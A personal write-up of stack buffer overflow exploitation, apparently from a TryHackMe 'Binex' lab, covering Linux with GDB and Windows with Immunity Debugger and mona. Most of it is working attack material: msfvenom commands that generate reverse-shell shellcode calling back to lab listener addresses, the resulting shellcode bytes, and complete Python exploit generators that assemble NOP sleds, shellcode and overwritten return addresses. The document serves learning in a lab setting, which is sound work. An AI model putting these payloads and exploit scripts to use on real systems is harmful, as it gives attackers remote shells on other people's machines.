# Buffer Overflow theory

Based on experiences from TryHackMe room https://tryhackme.com/room/binex, I need to get better at this, so here is a mini writeup for that portion of the room.

## Linux with GDB

Instructions below are based on a executable that reads a string then overflows, named `bof`. The methodology here is largely extracted from one of the writeups for Binex: https://github.com/Syp1ng/Writeups/blob/master/THM/Binex.pdf. The author in turn sourced some knowledge from here: https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558

1. First, generate a test string using metasploit's pattern_create.rb: 
  
    You can find the location of the script using `find / -name pattern_create.rb`. Here are two locations I've seen:

    - `/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 1000`
    - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000`
  
2. Open the exe with gdb. E.g. `gdb ./bof`. Breakpoints are not necessary, but as a quick primer if you do want them:

    - `info functions` shows all functions
    - `disas <function>` renders the assembly for a function, including the mem addresses and their offsets
    - `b * <function name>+<offset>` sets a breakpoint. E.g. `b * foo+39` will set a breakpoint in the function foo at offset 39
    - to run the code up to a break point (or just generally) use `r`. You can also pipe data into `r` if you like, or pass args to it.

3. Run til it asks for data, then paste in the test string. It should run and segfault after this.

4. Use `info registers` to see the register contents. Hopefully you should see something like this:

      ```
      (gdb) info registers
      rax            0x0      0
      rbx            0x3e9    1001
      rcx            0x0      0
      rdx            0x0      0
      rsi            0x555555554956   93824992233814
      rdi            0x7ffff7dd0760   140737351845728
      rbp            0x4134754133754132       0x4134754133754132
      rsp            0x7fffffffe228   0x7fffffffe228
      r8             0xffffffffffffffed       -19
      r9             0x25e    606
      r10            0x5555557564cb   93824994337995
      r11            0x555555554956   93824992233814
      r12            0x3e9    1001
      r13            0x7fffffffe320   140737488347936
      ```

      That value for rbp is what is needed: `4134754133754132` Take this, and run it against another metasploit script: pattern_offset. It should be just next to pattern_create:

      ```
      root@ip-10-10-167-14:~# /opt/metasploit-framework-5101/tools/exploit/pattern_offset.rb -q 4134754133754132
      [*] Exact match at offset 608
      ```
    
5. Before leaving gdb, also take a look at the stack via `x/100x $rsp-700`. Should see something like this:

    ```
    (gdb) x/100x $rsp-700
    0x7fffffffdf6c: 0x00007fff      0x00000012      0x00000000      0xf7dd0760
    0x7fffffffdf7c: 0x00007fff      0x55554934      0x00005555      0xf7a64b62
    0x7fffffffdf8c: 0x00007fff      0xf79e90e8      0x00007fff      0x000003e9
    0x7fffffffdf9c: 0x00000000      0xffffe220      0x00007fff      0x000003e9
    0x7fffffffdfac: 0x00000000      0xffffe320      0x00007fff      0x55554848
    0x7fffffffdfbc: 0x00005555      0x41306141      0x61413161      0x33614132
    0x7fffffffdfcc: 0x41346141      0x61413561      0x37614136      0x41386141
    0x7fffffffdfdc: 0x62413961      0x31624130      0x41326241      0x62413362
    0x7fffffffdfec: 0x35624134      0x41366241      0x62413762      0x39624138
    0x7fffffffdffc: 0x41306341      0x63413163      0x33634132      0x41346341
    0x7fffffffe00c: 0x63413563      0x37634136      0x41386341      0x64413963
    0x7fffffffe01c: 0x31644130      0x41326441      0x64413364      0x35644134
    0x7fffffffe02c: 0x41366441      0x64413764      0x39644138      0x41306541
    0x7fffffffe03c: 0x65413165      0x33654132      0x41346541      0x65413565
    0x7fffffffe04c: 0x37654136      0x41386541      0x66413965      0x31664130
    0x7fffffffe05c: 0x41326641      0x66413366      0x35664134      0x41366641
    0x7fffffffe06c: 0x66413766      0x39664138      0x41306741      0x67413167
    0x7fffffffe07c: 0x33674132      0x41346741      0x67413567      0x37674136
    0x7fffffffe08c: 0x41386741      0x68413967      0x31684130      0x41326841
    0x7fffffffe09c: 0x68413368      0x35684134      0x41366841      0x68413768
    0x7fffffffe0ac: 0x39684138      0x41306941      0x69413169      0x33694132
    0x7fffffffe0bc: 0x41346941      0x69413569      0x37694136      0x41386941
    0x7fffffffe0cc: 0x6a413969      0x316a4130      0x41326a41      0x6a41336a
    0x7fffffffe0dc: 0x356a4134      0x41366a41      0x6a41376a      0x396a4138
    0x7fffffffe0ec: 0x41306b41      0x6b41316b      0x336b4132      0x41346b41
    ```

    Here you can see the test string starting near the top. Pick one of those side addresses further down - this address might work or not, you might need to do some trial and error so keep this output handy. E.g. from the above I tried two, the first failing, before `0x7fffffffe07c` worked for me.
    
6. Get some shell code. One way to make this, which works when you have a lot of space (in binex I had around 1000 bytes, but thats rare) is to use msfvenom. Here I created a reverse shell caller: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.167.14 LPORT=4444 -b '\x00' -f python`. This prints out some python code:

    ```
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    Found 4 compatible encoders
    Attempting to encode payload with 1 iterations of generic/none
    generic/none failed with Encoding failed due to a bad character (index=17, char=0x00)
    Attempting to encode payload with 1 iterations of x64/xor
    x64/xor succeeded with size 119 (iteration=0)
    x64/xor chosen with final size 119
    Payload size: 119 bytes
    Final size of python file: 597 bytes
    buf =  b""
    buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
    buf += b"\xef\xff\xff\xff\x48\xbb\xda\x1d\x37\xc7\xb5\x95\x34"
    buf += b"\x41\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    buf += b"\xb0\x34\x6f\x5e\xdf\x97\x6b\x2b\xdb\x43\x38\xc2\xfd"
    buf += b"\x02\x7c\xf8\xd8\x1d\x26\x9b\xbf\x9f\x93\x4f\x8b\x55"
    buf += b"\xbe\x21\xdf\x85\x6e\x2b\xf0\x45\x38\xc2\xdf\x96\x6a"
    buf += b"\x09\x25\xd3\x5d\xe6\xed\x9a\x31\x34\x2c\x77\x0c\x9f"
    buf += b"\x2c\xdd\x8f\x6e\xb8\x74\x59\xe8\xc6\xfd\x34\x12\x92"
    buf += b"\x94\xd0\x95\xe2\xdd\xbd\xa7\xd5\x18\x37\xc7\xb5\x95"
    buf += b"\x34\x41"
    ```

7. Compile an exploit string. I created a python file I could invoke against the binary to exploit:

    ```python
    from struct import pack

    nop = '\x90'

    buf =  b""
    buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
    buf += b"\xef\xff\xff\xff\x48\xbb\xda\x1d\x37\xc7\xb5\x95\x34"
    buf += b"\x41\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    buf += b"\xb0\x34\x6f\x5e\xdf\x97\x6b\x2b\xdb\x43\x38\xc2\xfd"
    buf += b"\x02\x7c\xf8\xd8\x1d\x26\x9b\xbf\x9f\x93\x4f\x8b\x55"
    buf += b"\xbe\x21\xdf\x85\x6e\x2b\xf0\x45\x38\xc2\xdf\x96\x6a"
    buf += b"\x09\x25\xd3\x5d\xe6\xed\x9a\x31\x34\x2c\x77\x0c\x9f"
    buf += b"\x2c\xdd\x8f\x6e\xb8\x74\x59\xe8\xc6\xfd\x34\x12\x92"
    buf += b"\x94\xd0\x95\xe2\xdd\xbd\xa7\xd5\x18\x37\xc7\xb5\x95"
    buf += b"\x34\x41"

    calculated_offset = 608
    rip = 0x7fffffffe07c
    payload_len = calculated_offset + 8
    nop_payload = 300*nop
    shell_len = len(buf)
    nop_len = len(nop_payload)
    padding = 'A'*(payload_len - shell_len - nop_len)
    payload = nop_payload + buf + padding + pack("<Q", rip)

    print(payload)
    ```

8. Finally, all this in hand (and after setting up the shell listener!), run against the binary to exploit: `./bof < <(python exploit.py)`

## Windows with Immunity Debugger

The process is similar, but with one change that might actually work for linux too. With windows, I need to get a copy on my host machine so I can exploit it locally to test it.

1. First, just as with Linux, you need a pattern. metasploit is available for windows, but I just use WSL/Kali: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000`  

2. Install immunity if you dont have it, and mona.py. Mona can be obtained raw here: https://github.com/corelan/mona. Just save the py file under the 'PyCommands' folder in the immunity install directory (which for me was `C:\Program Files (x86)\Immunity Inc\Immunity Debugger`)

    Immunity help:
    
    - when opening the binary with immunity it will start paused
    - as a quick tip, go to the menu option `Options > Debugging Options > Security` and turn off 'Warn when terminating active processes'. Makes things a bit quicker.
    - Press the 'play' button or F9 to run the program. The 'rewind' icon or Shift+F2 is restart (it will restart paused).
    - the main windows used are 'CPU' which has four panes, and 'Log data'. There is also the command bar at the bottom, where you can invoke mona for example, and the results will show in log data. Otherwise CPU is what I keep up and maximised

3. Proceed to fail the program with your test string. Immunity will flash and pause when the program has crashed. On the CPU pain you are looking for the EIP value. This should contain a number of overritted characters - copy this and calculate the offset with `pattern_offset.rb` as under Linux. Note that grabbing the EIP rather than the RBP - we are not overriting the return address here, rather we are forcing given command to be executed.

4. Next, use mona to find the command we want to execute, specifically a `JMP ESP` call. From the command bar, run `!mona jmp -r esp`. The output will be in the log data window. For my test I had two entries - either could be used. Take the memory address (e.g. 0x080414c3) and reverse it into a string (e.g. `"\xc3\x14\x04\x08"`).

5. Generate some shell code with MSF Venom. Here is a command that will do this while omitting two bad characters: `msfvenom --payload windows/shell_reverse_tcp LHOST=10.10.254.194 LPORT=5555 -b x00x0a --format python`

6. Finally create the exploit python generator. Something like the below:

    ```python
    from struct import pack

    nop = '\x90'

    buf =  b""
    buf += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
    buf += b"\x76\x0e\xab\x95\x90\xaa\x83\xee\xfc\xe2\xf4\x57\x7d"
    buf += b"\x12\xaa\xab\x95\xf0\x23\x4e\xa4\x50\xce\x20\xc5\xa0"
    buf += b"\x21\xf9\x99\x1b\xf8\xbf\x1e\xe2\x82\xa4\x22\xda\x8c"
    buf += b"\x9a\x6a\x3c\x96\xca\xe9\x92\x86\x8b\x54\x5f\xa7\xaa"
    buf += b"\x52\x72\x58\xf9\xc2\x1b\xf8\xbb\x1e\xda\x96\x20\xd9"
    buf += b"\x81\xd2\x48\xdd\x91\x7b\xfa\x1e\xc9\x8a\xaa\x46\x1b"
    buf += b"\xe3\xb3\x76\xaa\xe3\x20\xa1\x1b\xab\x7d\xa4\x6f\x06"
    buf += b"\x6a\x5a\x9d\xab\x6c\xad\x70\xdf\x5d\x96\xed\x52\x90"
    buf += b"\xe8\xb4\xdf\x4f\xcd\x1b\xf2\x8f\x94\x43\xcc\x20\x99"
    buf += b"\xdb\x21\xf3\x89\x91\x79\x20\x91\x1b\xab\x7b\x1c\xd4"
    buf += b"\x8e\x8f\xce\xcb\xcb\xf2\xcf\xc1\x55\x4b\xca\xcf\xf0"
    buf += b"\x20\x87\x7b\x27\xf6\xfd\xa3\x98\xab\x95\xf8\xdd\xd8"
    buf += b"\xa7\xcf\xfe\xc3\xd9\xe7\x8c\xac\x6a\x45\x12\x3b\x94"
    buf += b"\x90\xaa\x82\x51\xc4\xfa\xc3\xbc\x10\xc1\xab\x6a\x45"
    buf += b"\xfa\xfb\xc5\xc0\xea\xfb\xd5\xc0\xc2\x41\x9a\x4f\x4a"
    buf += b"\x54\x40\x07\xc0\xae\xfd\xef\xaa\xab\x94\xf8\xa8\xab"
    buf += b"\x84\xcc\x23\x4d\xff\x80\xfc\xfc\xfd\x09\x0f\xdf\xf4"
    buf += b"\x6f\x7f\x2e\x55\xe4\xa6\x54\xdb\x98\xdf\x47\xfd\x60"
    buf += b"\x1f\x09\xc3\x6f\x7f\xc3\xf6\xfd\xce\xab\x1c\x73\xfd"
    buf += b"\xfc\xc2\xa1\x5c\xc1\x87\xc9\xfc\x49\x68\xf6\x6d\xef"
    buf += b"\xb1\xac\xab\xaa\x18\xd4\x8e\xbb\x53\x90\xee\xff\xc5"
    buf += b"\xc6\xfc\xfd\xd3\xc6\xe4\xfd\xc3\xc3\xfc\xc3\xec\x5c"
    buf += b"\x95\x2d\x6a\x45\x23\x4b\xdb\xc6\xec\x54\xa5\xf8\xa2"
    buf += b"\x2c\x88\xf0\x55\x7e\x2e\x60\x1f\x09\xc3\xf8\x0c\x3e"
    buf += b"\x28\x0d\x55\x7e\xa9\x96\xd6\xa1\x15\x6b\x4a\xde\x90"
    buf += b"\x2b\xed\xb8\xe7\xff\xc0\xab\xc6\x6f\x7f"

    calculated_offset = 146

    final = nop*calculated_offset
    final += "\xbf\x16\x04\x08"
    final += nop*16
    final += buf

    print(final)
    ```

7. Run this against the program as normal, with a listener waiting, to hopefully get a windows command prompt shell.

